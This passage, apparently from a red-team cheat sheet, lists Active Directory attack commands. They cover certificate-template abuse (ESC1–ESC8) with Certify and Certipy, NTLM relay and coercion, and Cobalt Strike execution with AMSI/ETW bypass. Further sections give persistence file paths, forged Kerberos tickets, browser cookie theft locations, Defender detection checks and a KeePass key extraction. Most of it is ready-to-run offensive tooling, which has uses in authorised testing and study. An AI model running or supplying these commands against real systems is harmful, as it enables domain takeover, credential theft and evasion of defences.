* https://github.com/leechristensen/SpoolSample
* `SpoolSample.exe <dc> <attacker>`


## AD CS

* Check for CA:
  * Linux
    * `rpc net group members "Cert Publishers" -U "<domain>"/"<user>"%"<pass>" -S "<dc>"`
  * Windows
    * `certutil -config - -ping`
    * `net group "Cert Publishers" /domain`
* https://github.com/GhostPack/Certify
* ESC1 - Misconfigured Certificate Templates
   * When a certificate template allows to specify a "subjectAltName", it is possible to request a certificate for another user. It can be used for privilege escalation if the EKU specifies "Client Authentication" or "ANY". If the EKU specifies "Server Authentication", you're out of luck.
   * Example: `Certify.exe request /ca:<server\ca-name> /template:<template> /altname:<domain>\<da>`
* ESC2 - Misconfigured Certificate Templates
   * When a certificate template specifies the "Any Purpose EKU", or no EKU at all, the certificate can be used for anything. ESC2 can be abused like ESC1 if the requester can specify a SAN. Otherwise it can be abused like ESC3.
   * Example: see ESC1 or ESC3.
* ESC3 - Misconfigured Enrollment Agent Templates
   * This is a kind of inception: when a certificate template specifies the "Certificate Request Agent" EKU, it is possible to request a certificate from this template first and then use this certificate to request certificates on behalf of other users.
   * Example:
      * `Certify.exe request <server\ca-name> /template:<template>`
      * `Certify.exe request <server\ca-name> /template:User /onbehalfon:<domain>\<da> /enrollcert:<cert.pfx> /enrollcertpw:<pass>`
* ESC4 - Vulnerable Certificate Template Access Control
   * If an attacker has FullControl or WriteDacl permissions over a certificate template’s AD object, this allows them to push a misconfiguration to a template that is not otherwise vulnerable, leading to ESC1 vulnerability. Always check the "Permissions" column if you have run Certify, and pay attention to, for example, "Full Control" or "WriteDacl". If Domain Users or Domain Computers appear in this list, you can change attributes yourself in the template. For example, you can set the EKU to "Client Authentication", you can disable manager approval, etc.
   * Examples can be found here: https://redteam.wiki/postexploitation/active-directory/adcs/esc4
   * Modify the EKU from ServerAuthentication to ClientAuthentication using PowerView:
     * `Set-DomainObject -SearchBase "LDAP://dc.domain.tld/CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=tld" -Identity WebServer -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose`
* ESC5 - Vulnerable PKI AD Object Access Control
   * This is a container for AD misconfigurations that happen outside of AD CS. For example, when you can take over the CA server computer object by means of an RBCD. Basically it involves compromising the CA server itself.
   * No examples here.
* ESC6 - `EDITF_ATTRIBUTESUBJECTALTNAME2`
   * If the CA is configured with the "EDITF_ATTRIBUTESUBJECTALTNAME2" flag, and the User template is enabled (Certify.exe will mention this), any user can escalate to domain admin. The idea is the same where you specify a subjectAltName.
   * Example: see ESC1.
* ESC7 - Vulnerable Certificate Authority Access Control
   * If an attacker has sufficient privileges over the Certificate Authority (ie "ManageCA"), it is possible to enable the "EDITF_ATTRIBUTESUBJECTALTNAME2" to allow SAN specification in any template.
   * Example:
      * `Certify.exe setconfig /enablesan /restart`
      * `Certify.exe request /ca:<server\ca-name> /template:<template> /altname:<domain>\<da>`
* ESC8: ESC8 - NTLM Relay to AD CS HTTP Endpoints
   * If HTTP-based certificate enrollment interfaces are enabled, they are most likely vulnerable to NTLM relay attacks. The domain controller's NTLM credentials can then be relayed to the AD CS web enrollment and a DC certificate can be enrolled. This certificate can then be used to request a TGT and perform a DCSync.
* Example:
   * `ntlmrelayx -t "http://<ca-server>/certsrv/certfnsh.asp" --adcs --template <template>`
   * Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
* Notes
   * In some cases, domain computers are allowed to request certificates (instead of domain users). If the "ms-ds-MachineAccountQuota" is set to > 1, it is possible to create a computer account yourself with PowerMad or SharpMad. Then you can request a TGT for this machine account using Rubeus. And then request a certificate with an altname (so a Domain Admin) using Certify.
   * Option 1 - `PowerMad: New-MachineAccount -MachineAccount <computername> -Password $(ConvertTo-SecureString '<pass>' -AsPlainText -Force)`
   * Option 2 - `SharpMad: Sharpmad.exe MAQ -Action new -MachineAccount <computername> -MachinePassword <pass>`
* Cobalt Strike
   * Check vulnerable for certificate templates
      * `inlineExecute-Assembly --dotnetassembly Certify.exe --assemblyargs find /vulnerable --amsi --etw`
   * Request certificate with alternative name
      * `inlineExecute-Assembly --dotnetassembly Certify.exe --assemblyargs request /ca:<server\ca-name> /template:<template> /altname:<domain>\<da> --amsi --etw`
      * Note that you can use the `/subject:CN=...` flag if the subject name contains too many characters.
   * Convert pem to pfx
      * `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
   * Upload the pfx
   * Request TGT
      * `inlineExecute-Assembly --dotnetassembly Rubeus.exe --assemblyargs asktgt /user:<da> /certificate:C:\Windows\Tasks\cert.pfx /password:<pfx_password> /ptt --amsi --etw`
   * Verify
      * `ls \\dc1.bamisoup.com\c$`

* Certipy - ESC1
  * https://github.com/ly4k/Certipy
  * Check vulnerable for certificate templates
    * `certipy find -u <user> -p <pass> -dc-ip <ip> -vulnerable`
  * Request certificate with alternative name
    * `certipy req -u <user> -p <pass> -ca <ca-name> -target <servername> -template <template> -upn <da>`
  * Authenticate (dumps NT hash and TGT)
    * `certipy auth -pfx administrator.pfx -dc-ip <ip>`
* Certipy - ESC8
  * Start relay
    * `certipy relay -ca <ca-server>`
  * Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
  * Authenticate (dumps NT hash and TGT)
    * `certipy auth -pfx <dc>.pfx -dc-ip <ip>`


## Empty passwords

* ActiveDirectory module 
   * `Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true} | Select SamAccountName`
* BloodHound 
   * `MATCH (n:User {enabled: True, passwordnotreqd: True}) RETURN n`
* Ldapsearch 
   * `ldapsearch (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2))) cn`
* Standin (C#)
   * `StandIn.exe --passnotreq`
* WMI 
   * `Get-WmiObject -Query "SELECT * FROM Win32_UserAccount WHERE PasswordRequired=False AND Disabled=False" | select Name`


## OSINT stuff

* AD FS
   * `AD FS discloses a lot of information at the endpoint: /adfs/ls/idpinitiatedsignon.aspx`
* Discover internal domain name
   * PowerShell
      * `$response = Invoke-WebRequest -Uri https://lyncdiscover.bcc.nl/ -SkipCertificateCheck`
      * `$response.Headers["X-MS-Server-Fqdn"]`
   * Nmap
      * `nmap -p 443 --script http-ntlm-info <domain>`
* Domain Fronting
   * `python3 FindFrontableDomains.py --domain outlook.com`
* Expired Domains
   * `https://member.expireddomains.net/`
* Subdomain Takeover
   * `aquatone-discover -d <domain>`
   * `aquatone-takeover -d <domain>`


## Ldapsearch

* Get all users with an SPN set for Kerberoasting
   * `ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"`
* LDAP Signing
   * `ldapsearch -LLL -H ldap://dc01.domain.local -x -D 'domain\username' -w '<pass>' -b 'dc=domain,dc=local' '(&(objectClass=person)(samAccountName=username))' samAccountName`
   * When LDAP server signing is required the following message will appear: authentication required (8)


## Implant persistence

* Excel
   * `C:\Documents and Settings\<user>\Application Data\Microsoft\Excel\XLSTART\evil.xll`
* Startup
   * `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe`
* Teams
   * `C:\Users\<user>\AppData\Local\Microsoft\Teams\current\AUDIOSES.DLL`


## Domain persistence

* Golden Ticket
  * If you have compromised the krbtgt account, you can create a Golden Ticket. This is basically a TGT containing a PAC which states that the user belongs to privileged groups. This PAC is signed with the krbtgt key and embedded in a forged TGT. With this TGT, Service Tickets can then be requested for any resource in the domain.
* Silver Ticket
  * If you have compromised a service account, you can create a Silver Ticket. This is basically a TGS containing a PAC with arbitraty information about the requesting user. This gives unrestricted access to the respective service. Since a Silver Ticket is a forged TGS, there is no communication with a Domain Controller. In theory this is a more stealthy approach. However, note that both type of tickets contain a forged PAC, which could be detected. Diamond Tickets offer a solution for this.
* Diamond Ticket
  * If you have compromised the krbtgt account, you can create a Diamond Ticket. A normal ticket is requested, in which the PAC is decrypted, modified and re-encrypted. This results in a legitimate TGT, containing a forged PAC which states that the user belongs to privileged groups. It is mentioned that the current implementation (Impacket - ticketer.py) this is not really well worked out. The Sapphire ticket approach is therefore recommended.
* Sapphire Ticket
  * Sapphire Tickets are similar to Diamond tickets, as a ticket is not forged, but a legitimate ticket is requested and modified. However, instead of adding privileged groups to the PAC, a legitimate privileged user PAC is gained by S4U tricks. This legitimate PAC is then embedded in the legitimate TGT. This makes it very difficult to detect effectively. To perform this last attack, you need to use this pull request:: https://github.com/SecureAuthCorp/impacket/pull/1411/files.


## Steal cookies

* Chrome
   * `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Local State`
   * `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies`
* Edge
   * `C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\\Local State`
   * `C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies`
 * Decrypt with: https://github.com/rxwx/chlonium


## Non-Domain-Joined

* Open cmd as admin
* runas /netonly
   * `.\Rubeus.exe createnetonly /show /program:cmd.exe /username:<user> /domain:<domain> /password:<pass>`
* Get TGT
   * `.\Rubeus.exe asktgt /user:<user> /password:<pass>`
* Check
   * `dir \\<domain>\SYSVOL`


## MDE check

* Check for MDE existence:
  * Running process: Task Manager > Details > MsSense.exe
  * Running service: Task Manager > Services > Sense
  * Registry key: req query "HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection"
  * File path: dir "C:\Program Files\Windows Defender Advanced Threat Protection"

* Processes explained:
  * MsMpEng.exe: Windows Antimalware Service Executable that enables Windows Defender to continuously monitor the computer for potential threats.
  * SenseNdr.exe: Microsoft Defender for Endpoint process in charge of passive network data collection.
  * MsSense.exe: Main Microsoft Defender for Endpoint process.


## MDI check

* https://github.com/expl0itabl3/check_mdi


## NTLMv1 downgrade

* Check for Compatibility Level:
  * LmCompatibilityLevel = 0x1: Send LM & NTLM
  * `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`
  * Or use the CrackMapExec module: ntlmv1
* Attack 1: Authentication Downgrade
  * Configure Responder to set a static challenge downgrade the authentication (1122334455667788)
  * Coerce authentication from the DC
  * Crack the incoming hash
  * DCSync
* Attack 2: LDAP Relay
  * Set up ntlmrelayx.py to strip the MIC while also performing a RBCD attack
  * Coerce authentication fom the DC
  * Craft a service ticket for an impersonated user (DA)
  * DCsync


## Miscellaneous

* DPAT
   * `python3 dpat.py -n dump.ntds -c cracked.txt`
* KeeThief
   * `Get-Process keepass | Get-KeePassDatabaseKey`
* Reset password
   * `smbpasswd -r <ip> -U '<domain>\<user>'`
* Seatbelt
   * `Seatbelt.exe -group=all`
* SharpAdidnsdump
   * `SharpAdidnsdump.exe <dc>`
* SharpShares
   * `SharpShares.exe /ldap:all`
* Snaffler
   * `snaffler.exe -s -o snaffler.log`
